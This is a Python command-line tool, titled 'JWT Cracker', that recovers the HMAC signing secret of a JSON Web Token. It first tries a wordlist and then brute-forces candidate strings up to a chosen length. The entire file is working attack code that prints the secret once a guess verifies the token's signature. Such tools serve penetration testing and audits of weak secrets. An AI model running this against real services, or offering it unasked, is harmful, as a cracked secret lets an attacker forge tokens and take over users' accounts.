import jwt
import argparse
from itertools import product
from jwt_validator import validateToken  # Importing the validator

def verify_jwt_with_secret(token, secret, algorithm):
   
    try:
        #  token signature is properly validated
        jwt.decode(token, secret, algorithms=[algorithm], options={"verify_signature": True})
        return True  # If the signature is valid, return True
    except jwt.InvalidSignatureError:
        return False  # The signature didn't match the secret
    except Exception as e:
        print(f"Error: {e}")
        return False


def try_dictionary_attack(token, dictionary_path, algorithm):
    """  crack the JWT using a dictionary attack. """
    with open(dictionary_path, 'r') as file:
        for line in file:
            secret = line.strip()  
            if not secret:
                continue
            print(f"Trying secret from dictionary: {secret}")  
            if verify_jwt_with_secret(token, secret, algorithm):
                return secret  # Return the found secret
    return None

def generate_brute_force_combinations(alphabet, max_length):
   
    for length in range(1, max_length + 1):
        for combination in product(alphabet, repeat=length):
            yield ''.join(combination)  

def try_brute_force_attack(token, alphabet, max_length, algorithm):
    """ Attempts to crack the JWT using a brute-force attack. """
    for secret in generate_brute_force_combinations(alphabet, max_length):
        print(f"Trying brute-force secret: {secret}") 
        if verify_jwt_with_secret(token, secret, algorithm):
            return secret
    return None

def parse_args():
    parser = argparse.ArgumentParser(description='JWT Cracker')
    parser.add_argument('-t', '--token', required=True, help='JWT token to crack')
    parser.add_argument('-d', '--dictionary', help='Path to dictionary file')
    parser.add_argument('-a', '--alphabet', default='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                        help='Alphabet to use for brute force (default: alphanumeric)')
    parser.add_argument('--max', type=int, default=4, help='Maximum length for brute force (default: 4)')
    parser.add_argument('--alg', choices=['HS256', 'HS384', 'HS512'], default='HS256', help='JWT algorithm used (default: HS256)')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    token = args.token
    dictionary_path = args.dictionary
    alphabet = args.alphabet
    max_length = args.max
    algorithm = args.alg

    #  Validate the token's format and algorithm
    is_valid, detected_algorithm = validateToken(token)
    if not is_valid:
        print("Invalid JWT format or unsupported algorithm.")
        exit(1)

    print(f"JWT is valid. Algorithm used: {detected_algorithm}")
    
   
    algorithm = detected_algorithm

    # Try  dictionary
    if dictionary_path:
        print("Starting dictionary attack...")
        secret_found = try_dictionary_attack(token, dictionary_path, algorithm)
        if secret_found:
            print(f"SECRET FOUND (Dictionary): {secret_found}")
            exit(0)
        else:
            print("Dictionary attack failed. Switching to brute-force attack...")

    # Try brute-force attack
    secret_found = try_brute_force_attack(token, alphabet, max_length, algorithm)
    if secret_found:
        print(f"SECRET FOUND (Brute-force): {secret_found}")
    else:
        print("SECRET NOT FOUND")
